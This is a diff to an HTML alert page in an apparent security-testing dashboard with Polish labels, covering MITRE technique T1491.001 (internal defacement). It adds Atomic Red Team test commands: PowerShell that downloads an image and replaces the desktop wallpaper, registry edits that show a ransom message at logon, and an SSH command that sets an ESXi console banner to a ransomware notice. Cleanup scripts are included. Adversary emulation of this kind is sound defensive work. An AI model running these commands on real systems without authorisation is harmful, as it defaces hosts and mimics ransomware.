@@ -19,7 +19,64 @@
 <body>
 <div class="card">
   <h1>Alert: Internal Defacement</h1>
-  <div class="meta"><b>Technique ID:</b> T1491.001</div>
+  <div class="meta"><b>Technique ID:</b> T1491.001<div style='background:#eaf4ff;border-radius:8px;padding:15px 16px;margin-top:25px;'><b>Atomic Red Team – dostępne testy dla tej techniki:</b><ul><li><b>Replace Desktop Wallpaper</b><br><b>Polecenia testowe (powershell):</b><pre>$url = "#{url_of_wallpaper}"
+$imgLocation = "#{wallpaper_location}"
+$orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\Control Panel\Desktop\' -Name WallPaper).WallPaper
+$orgWallpaper | Out-File -FilePath "#{pointer_to_orginal_wallpaper}"
+$updateWallpapercode = @' 
+using System.Runtime.InteropServices; 
+namespace Win32{
+
+    public class Wallpaper{ 
+        [DllImport("user32.dll", CharSet=CharSet.Auto)] 
+         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
+         
+         public static void SetWallpaper(string thePath){ 
+            SystemParametersInfo(20,0,thePath,3); 
+        }
+    }
+} 
+'@
+$wc = New-Object System.Net.WebClient  
+try{  
+    $wc.DownloadFile($url, $imgLocation)
+    add-type $updateWallpapercode 
+    [Win32.Wallpaper]::SetWallpaper($imgLocation)
+} 
+catch [System.Net.WebException]{  
+    Write-Host("Cannot download $url") 
+    add-type $updateWallpapercode 
+    [Win32.Wallpaper]::SetWallpaper($imgLocation)
+} 
+finally{    
+    $wc.Dispose()  
+}</pre><a href='../../scenarios/atomic_tests\T1491.001\Replace_Desktop_Wallpaper/test_1.ps1'>Pobierz test_1.ps1</a><br><b>Polecenia cleanup (powershell):</b><pre>$updateWallpapercode = @' 
+using System.Runtime.InteropServices; 
+namespace Win32{
+
+    public class Wallpaper{ 
+        [DllImport("user32.dll", CharSet=CharSet.Auto)] 
+         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
+         
+         public static void SetWallpaper(string thePath){ 
+            SystemParametersInfo(20,0,thePath,3); 
+        }
+    }
+} 
+'@
+if (Test-Path -Path #{pointer_to_orginal_wallpaper} -PathType Leaf) {
+     $orgImg = Get-Content -Path "#{pointer_to_orginal_wallpaper}"
+     add-type $updateWallpapercode 
+     [Win32.Wallpaper]::SetWallpaper($orgImg)
+}
+Remove-Item "#{pointer_to_orginal_wallpaper}" -ErrorAction Ignore
+Remove-Item "#{wallpaper_location}" -ErrorAction Ignore</pre><a href='../../scenarios/atomic_tests\T1491.001\Replace_Desktop_Wallpaper/cleanup_1.ps1'>Pobierz cleanup_1.ps1</a><br></li><li><b>Configure LegalNoticeCaption and LegalNoticeText registry keys to display ransom message</b><br><b>Polecenia testowe (powershell):</b><pre>$orgLegalNoticeCaption = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption).LegalNoticeCaption
+$orgLegalNoticeText = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText).LegalNoticeText
+$newLegalNoticeCaption = "#{legal_notice_caption}"
+$newLegalNoticeText = "#{legal_notice_text}"
+Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force
+Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force</pre><a href='../../scenarios/atomic_tests\T1491.001\Configure_LegalNoticeCaption_and_LegalNo/test_1.ps1'>Pobierz test_1.ps1</a><br><b>Polecenia cleanup (powershell):</b><pre>Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption -Value $orgLegalNoticeCaption -Type String -Force
+Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $orgLegalNoticeText -Type String -Force</pre><a href='../../scenarios/atomic_tests\T1491.001\Configure_LegalNoticeCaption_and_LegalNo/cleanup_1.ps1'>Pobierz cleanup_1.ps1</a><br></li><li><b>ESXi - Change Welcome Message on Direct Console User Interface (DCUI)</b><br><b>Polecenia testowe (cmd):</b><pre>echo "" | "#{plink_file}" -batch "#{vm_host}" -ssh -l #{vm_user} -pw "#{vm_pass}" "esxcli system welcomemsg set -m 'RANSOMWARE-NOTIFICATION'"</pre><a href='../../scenarios/atomic_tests\T1491.001\ESXi_-_Change_Welcome_Message_on_Direct_/test_1.cmd'>Pobierz test_1.cmd</a><br></li></ul><a href='https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1491.001' target='_blank'>Zobacz wszystkie testy na GitHubie</a></div></div>
   <div class="tactic section"><b>Tactics:</b> <a href="https://attack.mitre.org/tactics/TA0040/" target="_blank">Impact (TA0040)</a></div>
   <div class="status section"><b>Status:</b> Pending</div>
   <div class="scenario-block"><b>Twój opis scenariusza:</b><br>Opis scenariusza, podatności lub techniki.</div>
